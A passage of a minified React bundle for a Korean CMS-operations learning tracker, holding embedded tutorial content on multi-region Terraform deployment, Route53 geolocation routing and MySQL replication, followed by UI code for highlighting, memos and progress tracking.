\`\`\`hcl
resource "aws_route53_zone" "main" {
  name = "example.com"
}

# 서울 리전 레코드
resource "aws_route53_record" "seoul" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "app.example.com"
  type    = "A"
  ttl     = 60

  set_identifier = "Seoul"
  geolocation_routing_policy {
    continent = "AS"
  }

  records = [module.seoul_stack.public_ip]
}

# 오리건 리전 레코드
resource "aws_route53_record" "oregon" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "app.example.com"
  type    = "A"
  ttl     = 60

  set_identifier = "Oregon"
  geolocation_routing_policy {
    continent = "NA"
  }

  records = [module.oregon_stack.public_ip]

  # Health Check 연동
  health_check_id = aws_route53_health_check.oregon.id
}

# Health Check
resource "aws_route53_health_check" "oregon" {
  fqdn              = module.oregon_stack.web_url
  port              = 80
  type              = "HTTP"
  resource_path     = "/health"
  failure_threshold = 3
  request_interval  = 30

  tags = {
    Name = "Oregon Health Check"
  }
}
\`\`\`

**전체 리전 배포 스크립트**:
\`\`\`bash
#!/bin/bash
# deploy-all-regions.sh

REGIONS=("ap-northeast-2" "us-west-2" "ap-southeast-1")

for REGION in "\${REGIONS[@]}"; do
  echo "🌏 Deploying to $REGION..."

  cd regions/$REGION
  terraform init
  terraform apply -auto-approve -var-file=../../environments/prod.tfvars

  # Health Check
  HEALTH_URL=$(terraform output -raw web_url)/health
  curl -f $HEALTH_URL || echo "⚠️  $REGION health check failed!"

  cd ../..
done

# 글로벌 DNS 업데이트
echo "🌐 Updating global DNS..."
cd global
terraform init
terraform apply -auto-approve

echo "✅ Multi-region deployment completed!"
\`\`\`

**데이터베이스 복제 (Primary → DR)**:
\`\`\`bash
#!/bin/bash
# db-replication.sh - 서울 → 오리건 실시간 복제

PRIMARY_DB="seoul-mysql"
DR_DB="oregon-mysql"

# Binary Log 기반 복제 설정
docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
  CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
  GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
  FLUSH PRIVILEGES;
  SHOW MASTER STATUS;
"

# DR에서 복제 시작
MASTER_LOG_FILE=$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $1}')
MASTER_LOG_POS=$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $2}')

docker exec \${DR_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
  CHANGE MASTER TO
    MASTER_HOST='primary-server.example.com',
    MASTER_USER='repl',
    MASTER_PASSWORD='repl_password',
    MASTER_LOG_FILE='\${MASTER_LOG_FILE}',
    MASTER_LOG_POS=\${MASTER_LOG_POS};
  START SLAVE;
  SHOW SLAVE STATUS\\G;
"

echo "✅ Cross-region replication configured!"
\`\`\``,checklist:["modules/app-stack/ 디렉토리에 재사용 가능한 모듈 작성","3개 리전(서울/오리건/싱가포르)에 각각 스택 배포","Route53에서 Geolocation 라우팅 설정 (아시아→서울, 미국→오리건)","db-replication.sh로 서울→오리건 DB 실시간 복제 설정","VPN으로 미국 IP 사용해서 오리건 서버로 라우팅되는지 확인"]}]}}}]}]},o0=({size:S=24})=>u.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[u.jsx("path",{d:"m9 11-6 6v3h9l3-3"}),u.jsx("path",{d:"m22 12-4.6 4.6a2 2 0 0 1-2.8 0l-5.2-5.2a2 2 0 0 1 0-2.8L14 4"})]}),c0=({size:S=24})=>u.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",children:[u.jsx("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),u.jsx("line",{x1:"6",y1:"6",x2:"18",y2:"18"})]});function u0({isActive:S,onToggle:U}){return u.jsx("button",{onClick:U,className:`
        fixed bottom-6 right-6 w-14 h-14 rounded-full shadow-lg z-50
        flex items-center justify-center
        transition-all duration-200
        ${S?"bg-red-600 hover:bg-red-700 rotate-90":"bg-indigo-600 hover:bg-indigo-700"}
        text-white
        hover:scale-110
        active:scale-95
      `,"aria-label":S?"하이라이터 모드 끄기":"하이라이터 모드 켜기",title:S?"하이라이터 모드 끄기 (클릭)":"하이라이터 모드 켜기 (클릭)",children:S?u.jsx(c0,{size:24}):u.jsx(o0,{size:24})})}function r0(){const S=window.getSelection();return S?S.toString().trim():""}function d0(){const S=window.getSelection();return!S||S.rangeCount===0?null:S.getRangeAt(0).getBoundingClientRect()}function f0(S){if(!S)return null;const U=window.innerHeight,B=window.innerWidth,m=window.scrollY,L=window.scrollX,Y=S.top+m,Z=S.bottom+m,fe=S.left+L;S.right+L;const q=fe+S.width/2,b=S.bottom>U/2,M=60,D=10;let H,ne;b?(H=Y-M-D,ne="top"):(H=Z+D,ne="bottom");let me=q;const Be=300/2;return me-Be<L+10?me=L+Be+10:me+Be>L+B-10&&(me=L+B-Be-10),{x:me,y:H,placement:ne}}function m0({isActive:S,onTextSelected:U}){return Ne.useEffect(()=>{if(!S)return;const B=()=>{setTimeout(()=>{const L=r0();if(!L||L.length<2)return;const Y=d0();if(!Y)return;const Z=f0(Y);Z&&U({text:L,position:Z})},10)},m=L=>{L.preventDefault()};return document.addEventListener("mouseup",B),document.addEventListener("touchend",B),document.addEventListener("contextmenu",m),()=>{document.removeEventListener("mouseup",B),document.removeEventListener("touchend",B),document.removeEventListener("contextmenu",m)}},[S,U]),null}const p0=()=>u.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("circle",{cx:"12",cy:"12",r:"10"}),u.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),u.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]}),h0=()=>u.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("path",{d:"M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"}),u.jsx("polyline",{points:"14 2 14 8 20 8"}),u.jsx("line",{x1:"16",y1:"13",x2:"8",y2:"13"}),u.jsx("line",{x1:"16",y1:"17",x2:"8",y2:"17"}),u.jsx("polyline",{points:"10 9 9 9 8 9"})]}),g0=()=>u.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("circle",{cx:"11",cy:"11",r:"8"}),u.jsx("path",{d:"m21 21-4.35-4.35"})]}),y0=()=>u.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("rect",{x:"9",y:"9",width:"13",height:"13",rx:"2",ry:"2"}),u.jsx("path",{d:"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"})]});function v0({selectedText:S,position:U,onImportant:B,onMemo:m,onSearch:L,onCopy:Y,onClose:Z}){if(!S||!U)return null;const{x:fe,y:q,placement:b}=U;return u.jsxs(u.Fragment,{children:[u.jsx("div",{className:"fixed inset-0 z-40",onClick:Z}),u.jsxs("div",{className:"fixed z-50 bg-white rounded-lg shadow-xl border border-gray-200 animate-fade-in",style:{left:`${fe}px`,top:`${q}px`,transform:"translateX(-50%)"},children:[b==="top"&&u.jsx("div",{className:`absolute left-1/2 -bottom-2 w-0 h-0 border-l-8 border-r-8 border-t-8
                          border-l-transparent border-r-transparent border-t-white
                          transform -translate-x-1/2`}),b==="bottom"&&u.jsx("div",{className:`absolute left-1/2 -top-2 w-0 h-0 border-l-8 border-r-8 border-b-8
                          border-l-transparent border-r-transparent border-b-white
                          transform -translate-x-1/2`}),u.jsxs("div",{className:"flex items-center gap-1 p-2",children:[u.jsxs("button",{onClick:()=>{B(S),Z()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-red-50
                       text-red-600 font-medium transition-colors`,title:"중요! 표시",children:[u.jsx(p0,{}),u.jsx("span",{className:"text-sm whitespace-nowrap",children:"중요!"})]}),u.jsx("div",{className:"w-px h-6 bg-gray-200"}),u.jsxs("button",{onClick:()=>{m(S),Z()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-indigo-50
                       text-indigo-600 font-medium transition-colors`,title:"메모 작성",children:[u.jsx(h0,{}),u.jsx("span",{className:"text-sm whitespace-nowrap",children:"메모"})]}),u.jsx("div",{className:"w-px h-6 bg-gray-200"}),u.jsxs("button",{onClick:()=>{L(S),Z()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-blue-50
                       text-blue-600 font-medium transition-colors`,title:"Google 검색",children:[u.jsx(g0,{}),u.jsx("span",{className:"text-sm whitespace-nowrap",children:"검색"})]}),u.jsx("div",{className:"w-px h-6 bg-gray-200"}),u.jsxs("button",{onClick:()=>{Y(S),Z()},className:`flex items-center gap-2 px-3 py-2 rounded-md hover:bg-green-50
                       text-green-600 font-medium transition-colors`,title:"클립보드에 복사",children:[u.jsx(y0,{}),u.jsx("span",{className:"text-sm whitespace-nowrap",children:"복사"})]})]})]})]})}function S0({message:S,type:U="success",onClose:B}){Ne.useEffect(()=>{const L=setTimeout(()=>{B()},3e3);return()=>clearTimeout(L)},[B]);const m=U==="success"?"bg-green-600":"bg-red-600";return u.jsx("div",{className:"fixed bottom-24 left-1/2 transform -translate-x-1/2 z-50 animate-fade-in",children:u.jsxs("div",{className:`${m} text-white px-6 py-3 rounded-lg shadow-lg
                      flex items-center gap-2 min-w-64 max-w-md`,children:[U==="success"?u.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"}),u.jsx("polyline",{points:"22 4 12 14.01 9 11.01"})]}):u.jsxs("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("circle",{cx:"12",cy:"12",r:"10"}),u.jsx("line",{x1:"15",y1:"9",x2:"9",y2:"15"}),u.jsx("line",{x1:"9",y1:"9",x2:"15",y2:"15"})]}),u.jsx("span",{className:"font-medium",children:S})]})})}const b0=({label:S,isSelected:U,onClick:B})=>u.jsx("button",{type:"button",onClick:B,className:`
      px-4 py-2 rounded-lg font-medium transition-all duration-200
      ${U?"bg-indigo-600 text-white shadow-md scale-105":"bg-gray-100 text-gray-700 hover:bg-gray-200"}
    `,children:S});function E0({selectedText:S,onSave:U,onClose:B}){const[m,L]=Ne.useState(""),[Y,Z]=Ne.useState(""),fe=["@이해","@질문","@심화","@상세"],q=()=>{if(!m){alert("카테고리를 선택해주세요.");return}if(!Y.trim()){alert("메모 내용을 입력해주세요.");return}U({text:S,category:m,memo:Y.trim()}),B()},b=M=>{(M.ctrlKey||M.metaKey)&&M.key==="Enter"&&q()};return u.jsx(u.Fragment,{children:u.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4",onClick:B,children:u.jsxs("div",{className:"bg-white rounded-xl shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto animate-fade-in",onClick:M=>M.stopPropagation(),children:[u.jsxs("div",{className:"sticky top-0 bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-between",children:[u.jsx("h2",{className:"text-xl font-bold text-gray-800",children:"메모 작성"}),u.jsx("button",{onClick:B,className:"text-gray-400 hover:text-gray-600 transition-colors","aria-label":"닫기",children:u.jsxs("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),u.jsx("line",{x1:"6",y1:"6",x2:"18",y2:"18"})]})})]}),u.jsxs("div",{className:"p-6 space-y-6",children:[u.jsxs("div",{children:[u.jsx("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:"선택된 텍스트"}),u.jsx("div",{className:"bg-yellow-50 border-l-4 border-yellow-400 p-4 rounded",children:u.jsx("p",{className:"text-gray-800 leading-relaxed",children:S})})]}),u.jsxs("div",{children:[u.jsxs("label",{className:"block text-sm font-medium text-gray-700 mb-3",children:["카테고리 선택 ",u.jsx("span",{className:"text-red-500",children:"*"})]}),u.jsx("div",{className:"flex flex-wrap gap-3",children:fe.map(M=>u.jsx(b0,{label:M,isSelected:m===M,onClick:()=>L(M)},M))})]}),u.jsxs("div",{children:[u.jsxs("label",{className:"block text-sm font-medium text-gray-700 mb-2",children:["메모 내용 ",u.jsx("span",{className:"text-red-500",children:"*"})]}),u.jsx("textarea",{value:Y,onChange:M=>Z(M.target.value),onKeyDown:b,placeholder:"메모를 입력하세요... (Ctrl/Cmd + Enter로 저장)",className:`w-full h-40 px-4 py-3 border border-gray-300 rounded-lg
                         focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent
                         resize-none`}),u.jsx("p",{className:"mt-2 text-sm text-gray-500",children:"💡 Tip: Ctrl/Cmd + Enter를 눌러 빠르게 저장할 수 있습니다"})]})]}),u.jsxs("div",{className:"sticky bottom-0 bg-gray-50 border-t border-gray-200 px-6 py-4 flex items-center justify-end gap-3",children:[u.jsx("button",{onClick:B,className:`px-5 py-2.5 rounded-lg font-medium text-gray-700 bg-white border border-gray-300
                       hover:bg-gray-50 transition-colors`,children:"취소"}),u.jsx("button",{onClick:q,className:`px-5 py-2.5 rounded-lg font-medium text-white bg-indigo-600
                       hover:bg-indigo-700 transition-colors shadow-md hover:shadow-lg`,children:"저장"})]})]})})})}function _0(){const[S,U]=Ne.useState(()=>{try{const b=localStorage.getItem("cms-tracker-notes");return b?JSON.parse(b):{highlights:[],memos:[]}}catch(b){return console.error("Failed to load notes:",b),{highlights:[],memos:[]}}});return Ne.useEffect(()=>{try{localStorage.setItem("cms-tracker-notes",JSON.stringify(S))}catch(b){console.error("Failed to save notes:",b)}},[S]),{notes:S,addHighlight:(b,M="")=>{const D={id:crypto.randomUUID(),text:b,type:"important",timestamp:new Date().toISOString(),source:M};return U(H=>({...H,highlights:[...H.highlights,D]})),D.id},addMemo:(b,M,D,H="")=>{const ne={id:crypto.randomUUID(),text:b,category:M,memo:D,timestamp:new Date().toISOString(),source:H};return U(me=>({...me,memos:[...me.memos,ne]})),ne.id},deleteNote:(b,M)=>{M==="highlight"?U(D=>({...D,highlights:D.highlights.filter(H=>H.id!==b)})):M==="memo"&&U(D=>({...D,memos:D.memos.filter(H=>H.id!==b)}))},updateNote:(b,M,D)=>{M==="highlight"?U(H=>({...H,highlights:H.highlights.map(ne=>ne.id===b?{...ne,...D}:ne)})):M==="memo"&&U(H=>({...H,memos:H.memos.map(ne=>ne.id===b?{...ne,...D}:ne)}))},clearAllNotes:()=>{confirm("모든 노트를 삭제하시겠습니까?")&&U({highlights:[],memos:[]})},exportNotes:()=>{const b=JSON.stringify(S,null,2),M=new Blob([b],{type:"application/json"}),D=URL.createObjectURL(M),H=document.createElement("a");H.href=D,H.download=`cms-notes-${new Date().toISOString().split("T")[0]}.json`,H.click(),URL.revokeObjectURL(D)},importNotes:b=>{try{const M=JSON.parse(b);return M.highlights&&M.memos?(U(M),!0):!1}catch(M){return console.error("Failed to import notes:",M),!1}}}}const Af=({size:S=24})=>u.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:u.jsx("polyline",{points:"6 9 12 15 18 9"})}),xf=({size:S=24})=>u.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:u.jsx("polyline",{points:"9 18 15 12 9 6"})}),T0=({size:S=20,className:U=""})=>u.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:U,children:[u.jsx("path",{d:"M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"}),u.jsx("path",{d:"m9 12 2 2 4-4"})]}),R0=({size:S=20,className:U=""})=>u.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:U,children:u.jsx("circle",{cx:"12",cy:"12",r:"10"})}),A0=({size:S=16})=>u.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("circle",{cx:"12",cy:"12",r:"10"}),u.jsx("polyline",{points:"12 6 12 12 16 14"})]}),x0=({size:S=16})=>u.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[u.jsx("circle",{cx:"12",cy:"12",r:"10"}),u.jsx("circle",{cx:"12",cy:"12",r:"6"}),u.jsx("circle",{cx:"12",cy:"12",r:"2"})]}),C0=({size:S=20,className:U=""})=>u.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:U,children:[u.jsx("path",{d:"M4 19.5A2.5 2.5 0 0 1 6.5 17H20"}),u.jsx("path",{d:"M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"})]}),O0=({size:S=16,className:U=""})=>u.jsxs("svg",{xmlns:"http://www.w3.org/2000/svg",width:S,height:S,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",className:U,children:[u.jsx("circle",{cx:"12",cy:"12",r:"10"}),u.jsx("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),u.jsx("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})]});function D0(){const[S,U]=Ne.useState({}),[B,m]=Ne.useState({}),[L,Y]=Ne.useState({}),[Z,fe]=Ne.useState({}),[q,b]=Ne.useState(!1),[M,D]=Ne.useState(null),[H,ne]=Ne.useState(null),[me,xe]=Ne.useState(!1),[Be,Ye]=Ne.useState(""),{addHighlight:Ct,addMemo:ke}=_0();Ne.useEffect(()=>{const A=localStorage.getItem("cms-tracker-progress");if(A)try{const C=JSON.parse(A);Y(C.completedTasks||{}),fe(C.activeLevel||{}),U(C.expandedTiers||{}),m(C.expandedTopics||{})}catch(C){console.error("Failed to load progress:",C)}},[]),Ne.useEffect(()=>{const A={completedTasks:L,activeLevel:Z,expandedTiers:S,expandedTopics:B,lastUpdated:new Date().toISOString()};localStorage.setItem("cms-tracker-progress",JSON.stringify(A))},[L,Z,S,B]);const Ve=A=>{U(C=>({...C,[A]:!C[A]}))},dt=A=>{m(C=>({...C,[A]:!C[A]}))},He=A=>{Y(C=>({...C,[A]:!C[A]}))},$=(A,C)=>{fe(r=>({...r,[A]:r[A]===C?null:C}))},Ge=A=>{let C=0,r=0;return A.topics.forEach(p=>{p.tasks&&p.tasks.forEach((x,k)=>{C++;const z=`${p.id}-task-${k}`;L[z]&&r++})}),C>0?Math.round(r/C*100):0},Fe=()=>{let A=0,C=0;return Rf.tiers.forEach(r=>{r.topics.forEach(p=>{p.tasks&&p.tasks.forEach((x,k)=>{A++;const z=`${p.id}-task-${k}`;L[z]&&C++})})}),A>0?Math.round(C/A*100):0},Jt=A=>A.topics.reduce((C,r)=>C+(r.hours||0),0),ft=A=>{D(A)},Ce=(A,C="success")=>{ne({message:A,type:C})},qt=A=>{const C=Ct(A);Ce("중요! 표시로 저장되었습니다"),console.log("하이라이트 추가됨:",C)},Tt=A=>{Ye(A),xe(!0)},et=A=>{const C=ke(A.text,A.category,A.memo);Ce("메모가 저장되었습니다"),console.log("메모 추가됨:",C)},_=A=>{const C=encodeURIComponent(A);window.open(`https://www.google.com/search?q=${C}`,"_blank")},O=async A=>{try{await navigator.clipboard.writeText(A),Ce("클립보드에 복사되었습니다")}catch(C){console.error("복사 실패:",C),Ce("복사에 실패했습니다","error")}},Q=A=>!A||!A.sections?null:u.jsx("div",{className:"content-section",children:A.sections.map((C,r)=>u.jsxs("div",{className:"mb-4",children:[C.heading&&u.jsx("h3",{className:"font-bold text-lg mb-2",children:C.heading}),C.content&&u.jsx("p",{className:"mb-2",children:C.content}),C.list&&u.jsx("ul",{className:"list-disc pl-6 mb-2",children:C.list.map((p,x)=>u.jsx("li",{children:p},x))}),C.code&&u.jsx("pre",{className:"bg-slate-800 text-slate-100 p-4 rounded-lg overflow-x-auto mb-2",children:u.jsx("code",{children:C.code})}),C.steps&&u.jsx("div",{className:"space-y-2",children:C.steps.map((p,x)=>u.jsxs("div",{children:[u.jsxs("p",{className:"font-semibold",children:[p.label,": ",p.text]}),p.code&&u.jsx("pre",{className:"bg-slate-800 text-slate-100 p-3 rounded-lg overflow-x-auto mt-1",children:u.jsx("code",{children:p.code})}),p.note&&u.jsx("p",{className:"text-sm text-slate-600 mt-1",children:p.note})]},x))}),C.checklist&&u.jsxs(u.Fragment,{children:[u.jsx("ul",{className:"list-none pl-0",children:C.checklist.map((p,x)=>u.jsxs("li",{className:"flex items-start gap-2",children:[u.jsx("span",{children:"□"}),u.jsx("span",{children:p})]},x))}),C.nextStep&&u.jsxs("p",{className:"mt-3 font-semibold",children:["다음 단계: ",C.nextStep]})]})]},r))});return u.jsxs("div",{className:"min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-4 sm:p-6",children:[u.jsxs("div",{className:"max-w-6xl mx-auto",children:[u.jsxs("div",{className:"bg-white rounded-xl shadow-lg p-6 sm:p-8 mb-6",children:[u.jsx("h1",{className:"text-2xl sm:text-3xl font-bold text-slate-800 mb-2",children:"CMS 운영 학습 프레임워크"}),u.jsx("p",{className:"text-slate-600 mb-6 text-sm sm:text-base",children:"CapRover + Docker 환경에서 멀티 컨테이너 CMS 운영을 위한 체계적 학습 로드맵"}),u.jsxs("div",{className:"bg-gradient-to-r from-indigo-50 to-purple-50 rounded-lg p-4 border border-indigo-200",children:[u.jsxs("div",{className:"flex items-center justify-between mb-2",children:[u.jsx("span",{className:"text-sm font-semibold text-slate-700",children:"전체 진도율"}),u.jsxs("span",{className:"text-2xl font-bold text-indigo-600",children:[Fe(),"%"]})]}),u.jsx("div",{className:"w-full bg-slate-200 rounded-full h-3",children:u.jsx("div",{className:"bg-gradient-to-r from-indigo-500 to-purple-500 h-3 rounded-full transition-all duration-500",style:{width:`${Fe()}%`}})})]})]}),Rf.tiers.map(A=>{const C=Ge(A),r=S[A.id];return u.jsx("div",{className:"mb-4",children:u.jsxs("div",{className:`rounded-xl shadow-md border-2 overflow-hidden ${A.color}`,children:[u.jsx("button",{onClick:()=>Ve(A.id),className:"w-full p-4 sm:p-5 text-left hover:opacity-80 transition-opacity",children:u.jsxs("div",{className:"flex items-start justify-between",children:[u.jsxs("div",{className:"flex-1",children:[u.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 mb-2",children:[r?u.jsx(Af,{size:20}):u.jsx(xf,{size:20}),u.jsx("h2",{className:"text-lg sm:text-xl font-bold",children:A.name}),u.jsxs("span",{className:"text-xs sm:text-sm opacity-75",children:["(",A.period,")"]})]}),u.jsxs("p",{className:"text-xs sm:text-sm ml-7 sm:ml-9 opacity-90",children:["📌 ",A.reason]}),u.jsxs("div",{className:"flex items-center gap-3 sm:gap-4 ml-7 sm:ml-9 mt-2 text-xs sm:text-sm",children:[u.jsxs("div",{className:"flex items-center gap-1",children:[u.jsx(A0,{size:14}),u.jsxs("span",{children:[Jt(A),"시간"]})]}),u.jsxs("div",{className:"flex items-center gap-1",children:[u.jsx(x0,{size:14}),u.jsxs("span",{children:[A.topics.length,"개 주제"]})]})]})]}),u.jsxs("div",{className:"text-right ml-4",children:[u.jsxs("div",{className:"text-xl sm:text-2xl font-bold mb-1",children:[C,"%"]}),u.jsx("div",{className:"w-16 sm:w-24 bg-white bg-opacity-50 rounded-full h-2",children:u.jsx("div",{className:"bg-current h-2 rounded-full transition-all duration-500",style:{width:`${C}%`}})})]})]})}),r&&u.jsx("div",{className:"bg-white p-4 sm:p-5 space-y-3",children:A.topics.map(p=>{const x=B[p.id],k=p.tasks?p.tasks.filter((V,P)=>L[`${p.id}-task-${P}`]).length:0,z=Z[p.id];return u.jsxs("div",{className:"border border-slate-200 rounded-lg overflow-hidden",children:[u.jsx("button",{onClick:()=>dt(p.id),className:"w-full p-3 sm:p-4 text-left hover:bg-slate-50 transition-colors",children:u.jsx("div",{className:"flex items-start justify-between",children:u.jsxs("div",{className:"flex-1",children:[u.jsxs("div",{className:"flex items-center gap-2 mb-1",children:[x?u.jsx(Af,{size:16}):u.jsx(xf,{size:16}),u.jsxs("h3",{className:"font-semibold text-slate-800 text-sm sm:text-base",children:[p.id,". ",p.name]})]}),u.jsx("p",{className:"text-xs sm:text-sm text-slate-600 ml-5 sm:ml-6",children:p.goal}),u.jsxs("div",{className:"flex items-center gap-2 ml-5 sm:ml-6 mt-2 flex-wrap",children:[u.jsxs("span",{className:"text-xs bg-slate-100 text-slate-600 px-2 py-1 rounded",children:["⏱️ ",p.hours,"시간"]}),p.tasks&&p.tasks.length>0&&u.jsxs("span",{className:"text-xs bg-blue-100 text-blue-700 px-2 py-1 rounded",children:["✓ ",k,"/",p.tasks.length," 완료"]})]})]})})}),x&&u.jsxs("div",{className:"border-t border-slate-200",children:[p.content&&u.jsx("div",{className:"bg-slate-50 border-b border-slate-200",children:u.jsxs("div",{className:"flex gap-2 p-3 sm:p-4 overflow-x-auto",children:[u.jsx("button",{onClick:()=>$(p.id,"beginner"),className:`px-3 sm:px-4 py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors whitespace-nowrap ${z==="beginner"?"bg-green-100 text-green-800 border-2 border-green-300":"bg-white text-slate-600 border border-slate-300 hover:bg-slate-100"}`,children:"🌱 초급"}),u.jsx("button",{onClick:()=>$(p.id,"intermediate"),className:`px-3 sm:px-4 py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors whitespace-nowrap ${z==="intermediate"?"bg-blue-100 text-blue-800 border-2 border-blue-300":"bg-white text-slate-600 border border-slate-300 hover:bg-slate-100"}`,children:"🚀 중급"}),u.jsx("button",{onClick:()=>$(p.id,"advanced"),className:`px-3 sm:px-4 py-2 rounded-lg text-xs sm:text-sm font-medium transition-colors whitespace-nowrap ${z==="advanced"?"bg-purple-100 text-purple-800 border-2 border-purple-300":"bg-white text-slate-600 border border-slate-300 hover:bg-slate-100"}`,children:"⚡ 고급"})]})}),z&&p.content&&p.content[z]&&u.jsxs("div",{className:"p-4 sm:p-6 bg-gradient-to-br from-white to-slate-50",children:[u.jsxs("div",{className:"flex items-center gap-2 mb-4",children:[u.jsx(C0,{className:"text-indigo-600",size:20}),u.jsx("h4",{className:"font-bold text-base sm:text-lg text-slate-800",children:p.content[z].title})]}),u.jsx("div",{className:"bg-white rounded-lg p-4 sm:p-5 shadow-sm border border-slate-200",children:Q(p.content[z])})]}),!z&&u.jsxs("div",{className:"p-3 sm:p-4 bg-slate-50",children:[p.keywords&&u.jsxs("div",{className:"mb-4",children:[u.jsx("p",{className:"text-xs font-semibold text-slate-600 mb-2",children:"🏷️ 키워드"}),u.jsx("div",{className:"flex flex-wrap gap-2",children:p.keywords.map((V,P)=>u.jsx("span",{className:"text-xs bg-white text-slate-700 px-2 py-1 rounded border border-slate-200",children:V},P))})]}),p.tasks&&p.tasks.length>0&&u.jsxs("div",{children:[u.jsx("p",{className:"text-xs font-semibold text-slate-600 mb-2",children:"✅ 실습 과제"}),u.jsx("div",{className:"space-y-2",children:p.tasks.map((V,P)=>{const Oe=`${p.id}-task-${P}`,ge=L[Oe];return u.jsxs("button",{onClick:()=>He(Oe),className:"w-full flex items-start gap-3 p-3 bg-white rounded-lg hover:shadow-md transition-shadow text-left",children:[ge?u.jsx(T0,{size:18,className:"text-green-500 flex-shrink-0 mt-0.5"}):u.jsx(R0,{size:18,className:"text-slate-300 flex-shrink-0 mt-0.5"}),u.jsx("span",{className:`text-xs sm:text-sm ${ge?"text-slate-400 line-through":"text-slate-700"}`,children:V})]},Oe)})})]})]})]})]},p.id)})})]})},A.id)}),u.jsxs("div",{className:"bg-white rounded-xl shadow-lg p-4 sm:p-6 mt-6 text-center text-xs sm:text-sm text-slate-600",children:[u.jsxs("p",{className:"flex items-center justify-center gap-2 flex-wrap",children:[u.jsx(O0,{size:16,className:"text-indigo-600"}),u.jsxs("span",{children:["각 주제를 클릭하고 ",u.jsx("strong",{children:"초급/중급/고급"})," 버튼으로 단계별 학습 내용을 확인하세요"]})]}),u.jsx("p",{className:"mt-2",children:"실습 과제를 클릭하여 완료 표시를 하면 진도가 자동으로 계산됩니다"}),u.jsx("p",{className:"mt-4 text-xs text-slate-500",children:"💡 진도는 자동으로 